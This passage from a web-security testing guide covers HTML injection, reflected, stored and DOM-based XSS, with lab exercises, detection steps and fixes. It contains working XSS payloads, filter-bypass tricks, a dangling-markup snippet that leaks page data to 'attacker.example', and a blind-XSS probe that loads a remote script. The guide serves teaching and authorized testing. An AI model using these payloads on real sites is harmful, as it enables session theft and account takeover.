  scripts, links, and images at attacker infrastructure.
- **Exfiltrate via markup.** An injected `<img src="//attacker/?d=...">` makes the browser
  fire a request; CSS and `<link>` can leak too. Dangling-markup techniques (next section)
  steal page contents *without any script*.
- **Redirect** via `<meta http-equiv="refresh" content="0;url=//attacker">`.
- **Set up clickjacking/UI redress** with injected styled overlays.
- **Trigger CSRF** by injecting an auto-submitting form.

So even when CSP or filters stop script, injection is a real finding. Report it as such.

## 7.5 Dangling-markup injection (script-free data theft)

This technique deserves a focused look because it works even when script is impossible.

Suppose you can inject markup *before* some sensitive content on the page (a CSRF token, an
email address, a one-time code rendered later in the HTML). You inject an *unterminated*
attribute that "swallows" the following markup up to the next matching quote, sending it to
your server:

```html
<!-- Attacker injects this earlier in the page: -->
<img src="https://attacker.example/collect?leak=
```

Because the `src` attribute's value is never closed, the browser keeps consuming page bytes —
including the sensitive token that appears after the injection point — until it hits the next
`"` in the document. When the image request fires, the swallowed content is in the query string
sent to the attacker. No JavaScript required, so CSP `script-src` doesn't help; this is why
defenses like proper encoding (and CSP directives that constrain where requests can go) matter
even against "non-script" bugs.

Modern browsers have added mitigations (e.g., refusing to load images with raw newlines in the
URL, and CSP can restrict `img-src`/`connect-src`), but dangling markup remains a powerful
illustration that *markup control alone* can breach confidentiality.

## 7.6 Injection in different contexts (the same idea, different break-outs)

HTML injection follows the exact context map from Chapter 2. Your payload depends on where you
land:

**Element content** — you're already in markup; just add tags:
```
input:  <b>zqxj</b>
result: <p><b>zqxj</b></p>     ← interpreted
```

**Quoted attribute value** — first break out of the attribute, then add markup:
```
template: <input value="HERE">
input:    "><b>zqxj</b>
result:   <input value=""><b>zqxj</b>    ← escaped the attribute
```

**Unquoted attribute value** — a space introduces a new attribute (no quote needed):
```
template: <img alt=HERE>
input:    x onerror=...          ← but for pure HTML injection: x title=zqxj
```

**Inside a tag, between attributes** — inject a new attribute:
```
template: <input HERE value="x">
input:    onfocus=... autofocus  ← attribute-context (becomes XSS in Ch.8)
```

**Comment** — close the comment first:
```
template: <!-- HERE -->
input:    --><b>zqxj</b><!--
```

**`<textarea>`/`<title>`/`<script>`** — close the special element first:
```
template: <textarea>HERE</textarea>
input:    </textarea><b>zqxj</b>
```

Notice the recurring move: **identify what ends the current context, emit that, then inject.**
This is the single most important manual skill in Part III.

## 7.7 When encoding is partial: probing the filter

Often the app encodes *some* characters but not others, or strips certain tags. Map the filter
before crafting a payload:

1. Submit the canary (`zqxj'"<>`/\(){}[];:=&#`) and see which characters survive (Chapter 6).
2. If `<` and `>` survive but `"` is encoded, you may still inject tags in element content but
   not break out of double-quoted attributes.
3. If tags are stripped by name (e.g., `<script>` removed), test whether the *stripping is
   recursive*. A classic bypass: `<scr<script>ipt>` — if the filter removes the inner
   `<script>` once and doesn't re-scan, the remaining characters re-form `<script>`.
4. Test case and whitespace variants (`<ScRiPt>`, `<img/src>`), entity encoding in attribute
   contexts (`&#x6a;avascript:`), and the special-element tricks from Chapter 3.

The goal is to characterize *exactly* what the filter does, then find the gap. Filters are
blocklists; blocklists have holes.

## 7.8 Detecting HTML injection (tester's procedure)

1. **Find reflections** of your marker (Chapter 6).
2. **Inject a benign tag** (`<b>zqxj</b>`) and check whether it's interpreted in the rendered
   DOM (not just present as text in View Source).
3. **Identify the context** and the encoding applied.
4. **Determine reach** — only you, or other users/admins (stored)?
5. **Assess escalation** — can you reach a script or URL context (→ XSS, Chapter 8–10) or only
   structural markup (→ content spoofing/dangling markup)?
6. **Document** with the exact input, the exact location, the rendered result, and impact.

A subtlety: always confirm in the **rendered DOM**. An app might HTML-encode in the byte stream
but then a client-side script reads the value and writes it via `innerHTML`, re-introducing the
injection. View Source can lie; the Elements panel tells the truth.

## 7.9 Fixing HTML injection (preview of Part VI)

The fix is the same as for XSS and is covered fully in
[Chapter 18](#18-defense-remediation), but in brief:

- **Context-appropriate output encoding** is the primary control. For HTML element content and
  quoted attribute values, HTML-entity-encode `< > & " '` (and prefer encoding to a strict
  allow-list of safe characters). Modern template engines do this automatically — *if* you
  don't bypass them with "raw"/"safe"/`|safe`/`dangerouslySetInnerHTML`-style escape hatches.
- **For rich text** (where some HTML must be allowed), don't hand-roll a filter — use a
  vetted, well-maintained HTML **sanitizer** (e.g., a library built for this) configured with
  a strict allow-list, and be aware of mutation-XSS (Chapter 3).
- **Validate URL schemes** when data lands in `href`/`src` (allow only `http`/`https`/`mailto`
  as appropriate; reject `javascript:`/`data:`).
- **Defense in depth:** a strong **Content Security Policy** (Chapter 19) limits what injected
  markup can do even if a bug slips through.

The throughline: **encode on output, in the right context, every time.** Input "sanitization"
that tries to clean data on the way in is fragile and context-blind; output encoding at the
point of use is the durable fix.

## 7.10 Lab exercise

In a local vulnerable app (Chapter 17), find a field that reflects without encoding (DVWA's
"XSS (Reflected)" set to *low* is ideal, or Juice Shop's search). Then:

1. Prove HTML injection with `<b>zqxj</b>`.
2. Identify the context and which canary characters survive.
3. Without using script, build a **content-spoofing** PoC: inject a fake "session expired"
   banner. Observe how convincing it looks on the real domain.
4. Now raise the security level / enable encoding and watch the same payload render as inert
   text. Compare View Source vs the Elements panel.

This progression — inert text → interpreted markup → escalation — is the mental model you'll
reuse for all of XSS.

---

## Key takeaways

- HTML injection = untrusted data interpreted as **markup** due to missing context-appropriate
  encoding. Every XSS is an injection that reached code execution.
- Prove it harmlessly first with a benign tag like `<b>zqxj</b>`; escalate only in scope.
- Even without script, injection enables **content spoofing/phishing**, `<base>`/redirect
  hijacking, and **dangling-markup data theft** — report it as a real finding.
- Payload shape is dictated by **context**: find what ends the current context, emit it, then
  inject.
- Filters are blocklists with holes (recursive-strip bypass, case/whitespace/entity tricks).
- Fix with **context-appropriate output encoding**, vetted sanitizers for rich text, URL-scheme
  validation, and CSP as defense in depth.

---

<a id="08-xss-reflected"></a>

# Chapter 8 — Reflected XSS

> Reflected cross-site scripting is HTML injection that reaches JavaScript execution, where the
> payload travels in the *request* and bounces back in the *immediate response*. It's the most
> common XSS to find and the easiest to demonstrate — and the discipline of context-driven
> payload crafting you learn here carries into stored and DOM XSS.

---

## 8.1 What "reflected" means

In reflected XSS, the malicious input is part of the request (typically a URL parameter or form
field) and the server includes it, unsanitized, in the HTTP response it returns *right away*.
The payload is not stored; it executes only for whoever makes that specific request.

The attack therefore requires **delivery**: the attacker must get the victim to send the
crafted request, usually by getting them to click a crafted link (in email, chat, a comment, a
malicious ad) or by auto-submitting a form. Because it rides a single request/response, it's
sometimes called "non-persistent" XSS.

```
Attacker crafts URL:  https://app.example/search?q=<payload>
Victim clicks it →    browser sends request →    server reflects <payload> in HTML →
browser parses it →   payload executes in app.example's origin
```

That last line is the whole point: the script runs **in the target's origin**, with the
victim's session (Chapter 4). Reflected XSS is not "just an alert."

## 8.2 The reflected XSS lifecycle for a tester

1. **Find a reflection** of your marker in the immediate response (Chapter 6).
2. **Determine context + encoding** (Chapter 2).
3. **Craft a context-appropriate break-out** that introduces script execution.
4. **Confirm execution** with a benign signal.
5. **Assess impact and delivery**, then **document**.

The hard part is steps 2–3, and they are *entirely* about context. Let's go context by context.

## 8.3 Context-driven payloads

The benign confirmation we'll use throughout is intentionally harmless — e.g.,
`alert(document.domain)` (proves execution *and* the origin in one shot) or
`console.log('xss-zqxj')` (quiet). In a real engagement prefer the quietest signal that proves
the point; see [Chapter 1](#01-legal-and-ethics).

### (a) HTML element content

The template:
```html
<div>HERE</div>
```
If `<` and `>` are not encoded, just introduce an executing element. `<script>` works when the
response is parsed as a fresh document, but event-handler vectors are more reliable across
sinks:
```html
<svg onload=alert(document.domain)>
<img src=x onerror=alert(document.domain)>
```
`<svg onload>` is a favorite: short, no external resource needed, fires on parse.

### (b) Quoted attribute value

The template:
```html
<input type="text" value="HERE">
```
You must first close the attribute and (usually) the tag, then inject:
```
"><svg onload=alert(document.domain)>
```
If only the attribute can be broken but not the tag, add a new event-handler attribute instead:
```
" autofocus onfocus=alert(document.domain) x="
```
`autofocus` makes it fire without user interaction (Chapter 5).

### (c) Single-quoted / unquoted attribute value

Single-quoted needs a `'` to break out:
```
' autofocus onfocus=alert(document.domain) x='
```
Unquoted values end at whitespace, so you don't even need a quote — a space starts a new
attribute:
```
template: <input value=HERE>
input:    x onfocus=alert(document.domain) autofocus
```

### (d) Inside an existing event handler

The template:
```html
<button onclick="greet('HERE')">
```
You're already in JavaScript string context. Break the string and inject statements:
```
');alert(document.domain);//
```
Remember (Chapter 3): HTML-entity encoding does **nothing** here. If the app HTML-encoded the
value but left it in a JS context, you likely still execute.

### (e) Inside a `<script>` block

The template:
```html
<script> var q = "HERE"; </script>
```
Two routes:
- **Stay in JS** and break the string/statement:
  ```
  ";alert(document.domain);//
  ```
- **Escape the script element entirely** with a literal `</script>` and start fresh markup:
  ```
  </script><svg onload=alert(document.domain)>
  ```
The second works even when the app encoded quotes, because `</script>` ends the raw-text
element at the *tokenizer* level (Chapter 3).

### (f) URL / `href` context

The template:
```html
<a href="HERE">link</a>
```
HTML-entity encoding won't save this; use a script scheme:
```
javascript:alert(document.domain)
```
If a filter blocks the literal `javascript:`, recall attribute-context entity decoding
(Chapter 3): `javascript&#58;alert(document.domain)` may decode after the filter. Whitespace
and case tricks (`java\tscript:`, `JaVaScRiPt:`) also bypass naive matchers.

### (g) `<textarea>` / `<title>` (RCDATA)

Close the special element first, then inject:
```
</textarea><svg onload=alert(document.domain)>
</title><svg onload=alert(document.domain)>
```

The meta-skill, again: **what ends this context? Emit it, then inject an executing construct.**

## 8.4 Escalating past filters

When a naive filter blocks your first attempt, characterize it (Chapter 7 §7.7) and adapt.
Common, legitimate bypass families:

- **Case variation:** `<ScRiPt>`, `oNeRRoR`.
- **Whitespace/separators:** `<img/src=x/onerror=...>`, tabs/newlines inside the tag.
- **Tag/attribute alternatives:** if `onerror` is blocked, try `onload`, `onfocus`+`autofocus`,
  `onpointerover`, `onanimationstart`+CSS animation, `ontoggle` on `<details open>`.
- **No-`script` vectors:** `<svg>`, `<img>`, `<details>`, `<marquee>`, `<video>`, `<audio>` all
  carry event handlers — useful when `<script>` is filtered or CSP blocks inline `<script>`
  but allows event attributes (a misconfiguration).
- **Entity/encoding:** entity-encode payload characters in attribute/URL contexts where they're
  decoded (Chapter 3).
- **Recursive-strip:** `<scr<script>ipt>` against filters that strip once without re-scanning.
- **Charset confusion:** on legacy stacks, alternate encodings (Chapter 3 §3.9).

Each bypass is just exploiting a mismatch between the filter's model of HTML and the browser's
*actual* parsing — the central theme of this book. Use these only against authorized targets.

## 8.5 Reflected XSS in non-obvious places

Reflections aren't only in HTML bodies:

- **In JSON responses rendered as HTML.** An API returns JSON that a page injects via
  `innerHTML` — server "reflected" into a client sink (this blurs into DOM XSS, Chapter 10).
- **In error messages** ("`<your input>` is invalid").
- **In HTTP headers reflected into the body** (e.g., a `Referer`-driven "back" link, or
  `User-Agent` echoed in a debug page).
- **In `Content-Type: text/html` responses that shouldn't be HTML** — e.g., a file download or
  API endpoint served as HTML, where reflected input becomes markup. Combined with missing
  `X-Content-Type-Options: nosniff`, even non-HTML responses can be sniffed into HTML.
- **In PDFs/SVGs/other generated documents** rendered in the browser.

Map all of these (Chapter 6); reflected XSS hides outside the obvious search box.

## 8.6 Method and parameter considerations

- **GET-based reflected XSS** is the easiest to weaponize because the entire payload fits in a
  clickable URL — ideal (for an attacker) for phishing delivery. Prioritize these for impact.
- **POST-based reflected XSS** requires the attacker to auto-submit a form from a page they
  control (an HTML form with the right fields, JavaScript-submitted). Still exploitable, just
  needs a delivery page. Note this also intersects CSRF protections.
- **Header-based reflected XSS** (e.g., reflected `Referer`/`X-Forwarded-For`) needs a way to
  control that header in the victim's request, which constrains delivery but is sometimes
  possible.

Document the delivery requirements honestly in your report; they affect severity.

## 8.7 Confirming execution responsibly

To prove execution without harm:

- Prefer `alert(document.domain)` — it simultaneously proves *execution* and *which origin*
  you're running in (important when subdomains/sandboxes are involved).
- For quieter confirmation in shared environments, `console.log` a unique token or set
  `document.title`.
- **Do not** dump cookies to an external server, pivot into other users' sessions, or run
  destructive actions to "prove impact" unless your scope explicitly authorizes it and you use
  accounts you control. The existence of execution *is* the finding; impact can be described
  without realizing it.

## 8.8 Detecting reflected XSS (procedure)

1. For each reflection (Chapter 6), classify context + encoding.
2. Submit context-specific probes (e.g., `"><b>zqxj</b>` for attribute breakout) and watch the
   rendered DOM.
3. If markup interprets, escalate to a benign executing payload appropriate to the context.
4. Confirm with a harmless signal; capture request + response + screenshot.
5. Note delivery method (GET link vs POST form vs header) and any filter you bypassed.
6. Check CSP: even if you execute, note whether CSP *should* have stopped it (a finding either
   way — vulnerable code, or weak CSP, or both).

Automated scanners (Chapter 16) catch many reflected XSS, but context-aware manual testing
finds the ones they miss (script context, attribute breakouts requiring specific characters,
filter bypasses).

## 8.9 Fixing reflected XSS

Same core fix as all injection (full treatment in [Chapter 18](#18-defense-remediation)):

- **Context-appropriate output encoding** at the point the data is written into the response.
  HTML-encode for element/attribute contexts; JavaScript-string-encode for script contexts;
  URL-validate for URL contexts. Use framework auto-escaping and avoid "raw" escape hatches.
- **Validate and canonicalize input** as a secondary measure (allow-list expected formats), but
  never *instead* of output encoding.
- **Set a strong CSP** (Chapter 19) so that inline/event-handler payloads don't run even if a
  reflection slips through. A nonce/hash-based `script-src` without `'unsafe-inline'` neutralizes
  most reflected XSS as defense in depth.
- **Add `X-Content-Type-Options: nosniff`** and correct `Content-Type`s so non-HTML responses
  can't be coerced into HTML.

## 8.10 Lab exercise

Using PortSwigger's Web Security Academy reflected-XSS labs or DVWA:

1. Solve the **element-content** case with `<svg onload=alert(document.domain)>`.
2. Solve an **attribute** case requiring `"`-breakout and `autofocus`+`onfocus`.
3. Solve a **`<script>`-context** case both by JS-string breakout and by `</script>` escape.
4. Solve a **filtered** case by characterizing the blocklist and using a case/whitespace/entity
   bypass.
5. For each, note exactly which character the encoding *should* have neutralized.

Doing all four cements that the payload is a function of context — the thesis of Part III.

---

## Key takeaways

- Reflected XSS = payload in the request, echoed into the immediate response, executing in the
  victim's origin. It requires **delivery** (usually a crafted link).
- The payload is **dictated by context**: element content, quoted/unquoted/single-quoted
  attribute, existing event handler, `<script>` block, URL, or RCDATA. Learn the break-out for
  each.
- Filters are bypassable through case, whitespace, alternative event handlers/elements, entity
  decoding in attribute/URL contexts, and recursive-strip tricks — all exploiting parser/filter
  mismatches.
- Confirm with a **benign** signal (`alert(document.domain)`); don't realize impact without
  explicit authorization.
- Fix with context-appropriate **output encoding**, framework auto-escaping, strong **CSP**, and
  correct content types.

---

<a id="09-xss-stored"></a>

# Chapter 9 — Stored XSS

> Stored XSS is the most dangerous of the three classes because the payload is **persisted** by
> the application and served to other users automatically — no per-victim link required. One
> injection can hit every visitor, including administrators. This chapter is about finding
> those persistence paths and reasoning about *who* the payload reaches.

---

## 9.1 What "stored" means

In stored (a.k.a. persistent) XSS, the attacker's payload is saved on the server — in a
database, file, cache, log, or any durable store — and later included in responses to other
users **without proper encoding**. The execution happens whenever someone views the affected
content, potentially long after, and potentially for many victims.

```
Attacker submits payload once  →  app stores it (e.g., as a comment)  →
later, victim loads the page    →  app renders stored payload unencoded  →
payload executes in victim's session, in the app's origin
```

The contrast with reflected XSS is profound:

| | Reflected | Stored |
|---|---|---|
| Where payload lives | in the request | in the server's storage |
| Delivery | attacker must lure each victim to a link | victims arrive naturally |
| Reach | one request, one victim | every viewer of the content |
| Lifetime | one response | until removed |
| Typical severity | high | often critical |

Because stored XSS reaches users you didn't individually target — frequently **moderators and
admins** who review user content — it routinely leads to account takeover and privilege
escalation.

## 9.2 Where payloads get stored (and re-rendered)

Anywhere user data is saved and later displayed is a candidate. Common sinks:

- **Comments, reviews, posts, forum/chat messages.**
- **Profile fields:** display name, bio, "about me," website URL, avatar URL, status.
- **Support tickets / contact forms** rendered in an agent/admin console.
- **Filenames and file metadata** of uploads (shown in listings).
- **Product/catalog data** in marketplaces (seller-controlled descriptions).
- **Configuration/labels** users can set (project names, tags, custom fields).
- **Log entries** displayed in admin dashboards (log injection → stored XSS in the log viewer).
- **Cached responses** and **CDN-stored** content.
- **Imported data** (CSV/JSON imports, API-created records) — bypasses UI validation entirely.

The recurring insight from Chapter 6 applies hard here: **the place you inject is often not the
place it executes.** You might submit a payload in a "device name" field via an API and have it
fire days later in an operations dashboard.

## 9.3 Second-order and "blind" stored XSS

Two important variants:

**Second-order (stored) XSS.** Input enters through one feature and is rendered, unencoded, in a
*different* feature — often one with higher privilege. Example: you set your username with a
payload; it's encoded everywhere on the public site, but the admin "user management" table
renders it raw. The vulnerability is invisible from the attacker's own normal views.

**Blind XSS.** You inject a payload but never see it execute yourself, because it renders in a
context you can't access (an internal admin tool, a log viewer, a back-office CRM, an email
client). You detect it only when it "calls home." This is extremely common in:

- Contact/feedback forms (read by staff).
- User-agent / referer logging (viewed in analytics dashboards).
- Order notes, shipping instructions, job applications, abuse reports.

To detect blind XSS, testers use a payload that triggers an out-of-band callback to a server
they control, embedding contextual data so they can tell *where* it fired. Conceptually:

```html
<!-- Conceptual blind-XSS probe: loads a remote script that beacons back context -->
<script src="https://YOUR-COLLABORATOR-HOST/x"></script>
<!-- or an image/SVG variant when <script> is filtered -->
```

Specialized tooling (e.g., "XSS Hunter"-style collectors, or your proxy's out-of-band
interaction client — Chapter 16) captures the callback along with the page URL, DOM snapshot,
cookies you're authorized to view, and user-agent, telling you which internal tool executed it.

> **Ethics reminder ([Chapter 1](#01-legal-and-ethics)):** blind XSS by design fires in
> *someone else's* browser, often a staff member. Keep the callback payload benign (beacon +
> context only), ensure the collector is in scope/authorized, tag the payload, and remove stored
> probes afterward. Don't capture more than needed to prove the finding.

## 9.4 Context still rules

Everything from Chapter 8 about context-driven payloads applies identically to stored XSS — the
only difference is persistence and reach. When you inject into a stored field, you must still
ask: in *which* context will it be rendered on the *victim's* page? That can differ per render
location:

- Your bio might appear in element content on your profile but in an `alt` attribute on a
  hover-card and in a `<title>` on the admin tab — three different contexts from one stored
  value. A payload may need to work in the *highest-value* render context (the admin one).
- Encoding may be applied inconsistently across render locations (encoded on the public page,
  raw in the admin view) — the essence of second-order XSS.

So map *all* render locations of a stored field, classify each context, and target the
unencoded, highest-reach one.

## 9.5 The amplification factors that make stored XSS critical

When scoping impact, consider:

- **Audience size and privilege.** Does it hit every user? Admins? The more privileged the
  viewer, the worse — admin XSS often means full app compromise.
- **Persistence and worming.** A stored payload on a social feature can be self-propagating: it
  executes in a viewer's session and uses their access to post itself again (a "self-XSS worm").
  Historically, social platforms have suffered fast-spreading XSS worms this way. You do **not**
  build a worm during testing; you note the *potential* for self-propagation as an aggravating
  factor.
- **Bypassing CSRF protections.** Because stored XSS runs *as* the victim in the victim's
  origin, it can read anti-CSRF tokens and make authenticated state changes — defeating CSRF
  defenses entirely.
- **Reaching internal tools.** Blind/second-order paths can pop browsers behind the perimeter.

## 9.6 Detecting stored XSS (procedure)

1. **Inventory storage points** (Chapter 6): every field/feature that persists user data,
   including API-only and import paths.
2. **Inject tagged, benign probes.** Use a unique marker per field, e.g.,
   `zqxj-bio` → `<b>zqxj-bio</b>` first (HTML injection check), escalating to a benign
   executing payload only after confirming markup interprets and you've confirmed scope.
3. **Enumerate every render location** of that stored value — public pages, hover cards,
   listings, exports, emails, and especially **admin/staff views**. Use an account you control
   for any privileged view, or a blind-XSS collector for views you can't see.
4. **Classify context + encoding at each render location.** Find the unencoded, high-reach one.
5. **Confirm execution** with a benign signal; for blind cases, confirm via the out-of-band
   callback with contextual data.
6. **Clean up.** Remove or neutralize stored probes (or have the client do so). Record exactly
   what you stored and where, so it can be purged.

A practical tip: because stored payloads linger and can affect real users and colleagues, lead
with the *non-executing* `<b>zqxj</b>` injection to prove the flaw, and only escalate to an
executing payload when necessary and authorized. Often, proving markup interpretation in an
admin view is enough to demonstrate critical risk without ever popping a real admin.

## 9.7 Special considerations for rich-text and markdown features

Many stored-content features intentionally allow *some* HTML (comments with `<b>`, markdown
that renders to HTML, WYSIWYG editors). These are stored-XSS hotspots because the app must walk
the line between "allow formatting" and "block script." Test:

- **Markdown → HTML** conversion: does `[x](javascript:alert(1))` produce a dangerous link?
  Does raw HTML embedded in markdown pass through? Does an `<img>` with `onerror` survive?
- **Sanitizer gaps:** try foreign content (`<svg>`, `<math>`), mutation-XSS-prone structures,
  unusual attributes (`on*`, `style`, `srcset`, `formaction`), and protocol tricks in `href`.
- **Sanitize-then-modify bugs:** if the app sanitizes, then *post-processes* the HTML (e.g.,
  "linkify" URLs, add tracking, rewrite images), the post-processing can reintroduce
  vulnerabilities after the sanitizer ran.

[Chapter 18](#18-defense-remediation) covers building these features safely with a
vetted sanitizer and a strict allow-list.

## 9.8 Fixing stored XSS

The fix is — once more — **context-appropriate output encoding at render time**, plus:

- **Encode consistently at *every* render location**, not just the obvious one. Inconsistent
  encoding across views is the root of second-order XSS. Centralize rendering so every consumer
  of a field gets the same safe treatment.
- **For rich text, use a vetted, actively maintained sanitizer** with a strict allow-list,
  applied as close to render as possible, and re-applied if content is transformed afterward.
- **Don't trust "internal" or "admin" views.** Admin dashboards rendering user data are prime
  targets; they need the same encoding as public pages (arguably more, given their privilege).
- **CSP** (Chapter 19) as defense in depth, including on admin/internal apps.
- **Validate import/API paths**, not just the web UI — attackers reach storage through the path
  of least resistance.

The principle that prevents stored XSS is the same that prevents reflected and DOM XSS: treat
data as data at the moment it becomes part of a page, in whatever context that is.

## 9.9 Lab exercise

Using DVWA "XSS (Stored)" or Juice Shop's review/feedback features:

1. Store `<b>zqxj</b>` and confirm it renders as markup somewhere.
2. Identify **all** places the stored value appears (public + any admin/staff view available
   in the lab).
3. Escalate to a benign executing payload in the highest-reach context.
4. If the lab has an "admin/blind" component, set up a local collector and confirm the
   out-of-band callback.
5. Then enable the lab's higher security level (which adds encoding/sanitization) and observe
   the payload neutralized; inspect how the encoding differs per render location.

---

## Key takeaways

- Stored XSS persists server-side and executes for **every viewer** — often including admins —
  making it routinely **critical** and capable of defeating CSRF defenses.
- The injection point is frequently **not** the execution point: hunt **second-order** and
  **blind** paths (admin consoles, log viewers, support tools, imports/APIs).
- Context still dictates the payload; map **all** render locations of a stored value and target
  the **unencoded, highest-privilege** one.
- Detect with tagged benign probes and out-of-band collectors for blind cases; **clean up**
  stored artifacts and keep payloads non-destructive (real users/staff are affected).
- Fix by encoding **consistently at every render location**, using vetted sanitizers for rich
  text, treating admin views as untrusted-data consumers, and layering CSP.

---

<a id="10-xss-dom"></a>

# Chapter 10 — DOM-Based XSS

> In DOM-based XSS the vulnerability lives entirely in the **client-side code**. The server may
> return a perfectly innocent page; it's the JavaScript running in the browser that takes
> attacker-controlled input from a *source* and feeds it to a dangerous *sink*. Because the
> server never sees the malicious data flow, server-side filters and many WAFs are blind to it
> — which is exactly why it's increasingly common in modern single-page apps.

---

## 10.1 What makes DOM XSS different

Reflected and stored XSS are *server-side* failures: the server emits unsafe HTML. DOM-based
XSS is a *client-side* failure: the page's own JavaScript reads input and writes it into the
DOM (or executes it) unsafely. The malicious payload may never be sent to the server at all —
the classic example being a payload in the URL `#fragment`, which browsers do not transmit.

```
                       (browser only)
URL/#hash/postMessage  ──►  JS reads it (SOURCE)  ──►  JS writes to innerHTML/eval (SINK)
        │                                                         │
   attacker controls                                       execution in origin
```

Consequences for testing:

- **Server logs/WAFs may show nothing.** You diagnose it by reading JavaScript and observing the
  DOM, not by inspecting server responses.
- **The same page can be safe server-side but vulnerable client-side.** You must analyze the
  client code separately.
- **Frameworks both help and hurt.** Modern frameworks encode by default (good) but expose
  escape hatches (`dangerouslySetInnerHTML`, `v-html`, `[innerHTML]`, `bypassSecurityTrust*`)
  and client-side routing that introduce DOM sinks (bad).

## 10.2 Sources and sinks (recap and expand)

From Chapter 4, the data-flow vocabulary. The bug is **source → sink without sanitization**.

**Common sources (attacker-influenceable input read by JS):**
- `location.href`, `location.search`, `location.hash`, `location.pathname`
- `document.URL`, `document.documentURI`, `document.baseURI`
- `document.referrer`
- `window.name`
- `postMessage` `event.data`
- `localStorage` / `sessionStorage` / `document.cookie` values
- DOM values an attacker can set earlier (e.g., a form field, a `data-*` attribute)

**Dangerous sinks (cause execution or HTML parsing):**

| Category | Sinks |
|---|---|
| Code execution | `eval`, `Function`, `setTimeout`/`setInterval`(string arg), `execScript` |
| HTML parsing | `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write`/`writeln`, `DOMParser`, `Range.createContextualFragment` |
| URL/navigation | `location`/`location.href`/`assign`/`replace`, `a.href`, `window.open`, `iframe.src`, `iframe.srcdoc` |
| Script loading | `script.src`, `script.text`, dynamic `import()` |
| Event handlers | `el.onclick = ...` (with string-built code), `setAttribute('on*', ...)` |
| jQuery (legacy) | `$(selector_or_html)`, `.html()`, `.append()`, `.before()`, `.after()`, `.attr('href'/'src')` |
| Framework escape hatches | React `dangerouslySetInnerHTML`, Angular `bypassSecurityTrust*`, Vue `v-html` |

DOM XSS is the disciplined search for a path connecting the left column to the right.

## 10.3 The canonical example

```html
<!-- Server returns this innocent-looking page -->
<div id="welcome"></div>
<script>
  // Read a name from the URL query and display it
  const params = new URLSearchParams(location.search);
  document.getElementById('welcome').innerHTML = 'Hi ' + params.get('name'); // SINK
</script>
```

The server never interpolates anything; it ships static HTML + JS. But the JS takes
`location.search` (source) and assigns to `innerHTML` (sink). Visiting:

```
https://app.example/?name=<img src=x onerror=alert(document.domain)>
```

executes the payload entirely client-side. Had the developer used `textContent` instead of
`innerHTML`, there'd be no bug.

A hash-based variant — invisible to the server:

```js
// Vulnerable router reads the fragment and writes it
document.getElementById('view').innerHTML = decodeURIComponent(location.hash.slice(1));
```
```
https://app.example/#<svg onload=alert(document.domain)>
```

The `#...` is never sent to the server, so no server-side control can intervene.

## 10.4 Sink-specific exploitation

The payload depends on the *sink type*, paralleling how context drives server-side XSS:

**HTML-parsing sinks** (`innerHTML`, `document.write`, `insertAdjacentHTML`): inject markup with
event handlers (`<img onerror>`, `<svg onload>`). Note `innerHTML` won't run a bare `<script>`,
but `document.write` *will* (it feeds the parser). So `document.write(userInput)` is even more
dangerous than `innerHTML = userInput`.

**JavaScript-execution sinks** (`eval`, `setTimeout('...'+x)`): you don't need HTML at all —
inject JS expressions/statements directly. If `eval('config = ' + userInput)` runs, supply
`1;alert(document.domain)`.

**URL/navigation sinks** (`location = x`, `a.href = x`, `iframe.src = x`): use a script scheme,
`javascript:alert(document.domain)`, or chain into open redirect (next section).

**`srcdoc`/`iframe` sinks**: assigning attacker HTML to `iframe.srcdoc` parses a whole document
in the frame.

## 10.5 DOM-based open redirect and its escalation

A very common DOM bug:

```js
// "Return to where you came from" logic
location = new URLSearchParams(location.search).get('returnUrl');
```

If `returnUrl` isn't validated, `?returnUrl=https://evil.example` redirects the user off-site
(phishing). And if the navigation sink accepts script schemes, `?returnUrl=javascript:alert(...)`
escalates the open redirect into XSS. Open redirects are also CSRF/OAuth-flow enablers, so even
the "just a redirect" version is worth reporting.

## 10.6 `postMessage` vulnerabilities

`postMessage` enables cross-document communication. The frequent bug is a receiver that trusts
messages without validating the **origin** (and sometimes the format):

```js
// Vulnerable receiver
window.addEventListener('message', (e) => {
  // No origin check!
  document.getElementById('out').innerHTML = e.data;  // SINK
});
```

Any page that can get a handle to this window (e.g., by opening it or framing it) can `postMessage`
a payload and trigger the sink. As a tester:

- Enumerate `addEventListener('message', ...)` handlers in the JS.
- Check whether they validate `event.origin` against an allow-list and validate `event.data`'s
  shape.
- From a controlled page in your lab, send crafted messages and observe the sink.

Insecure `postMessage` handlers are a leading cause of DOM XSS in widget-heavy and embedded
applications.

## 10.7 Finding DOM XSS: reading the client code

DOM XSS is found by analysis, not just fuzzing. Workflow:

1. **Collect the JavaScript.** Include inline scripts, bundled files, and lazy-loaded chunks.
   Use the browser's debugger and the proxy (Chapter 16). Beautify/prettify minified bundles.
2. **Grep for sinks.** Search for `innerHTML`, `outerHTML`, `insertAdjacentHTML`,
   `document.write`, `eval`, `Function(`, `setTimeout(`/`setInterval(` with non-function args,
   `.src`, `.href`, `srcdoc`, `location`, `$(`, `.html(`, `dangerouslySetInnerHTML`, `v-html`,
   `bypassSecurityTrust`.
3. **Backtrack from each sink to a source.** For each sink hit, trace the variable backward: does
   it derive from `location.*`, `document.referrer`, `window.name`, `postMessage`, storage, or a
   DOM read? If yes, and there's no effective sanitization in between, you likely have DOM XSS.
4. **Confirm dynamically.** Use breakpoints/DOM-breakpoints, or just craft the input and watch
   it fire. Browser DevTools can set "break on subtree modification" to catch the moment a sink
   mutates the DOM.
5. **Mind the framework.** Identify React/Angular/Vue and look specifically for their escape
   hatches and any client-side templating that re-introduces sinks.

Tooling accelerates this: taint-tracking engines and DOM-XSS scanners (e.g., browser-based
source/sink instrumentation, the DOM Invader tool in some proxies) automate source→sink tracing.
But manual reading of the bundle remains the most reliable way to find subtle flows. Tools are
covered in [Chapter 16](#16-tooling).

## 10.8 Why DOM XSS slips past server-side defenses

Worth stating explicitly, because it shapes both attack and defense:

- **Server-side output encoding doesn't help** — the server isn't producing the dangerous HTML;
  the client is.
- **WAFs often can't see the payload** — especially fragment (`#`)-based or `postMessage`-based
  flows, which never traverse the network in a way the WAF inspects.
- **CSP can still help** — a strict CSP (no `'unsafe-inline'`, no `'unsafe-eval'`) blocks many
  DOM-XSS sinks (`eval`, inline event handlers from injected markup) even when the source→sink
  bug exists. This is a major reason CSP matters (Chapter 19). Note `eval` specifically requires
  `'unsafe-eval'`, so a CSP without it neutralizes `eval`-based DOM XSS.

## 10.9 Trusted Types: the structural fix

Modern browsers support **Trusted Types**, a mechanism that makes dangerous DOM sinks refuse
plain strings. With `Content-Security-Policy: require-trusted-types-for 'script'`, assignments
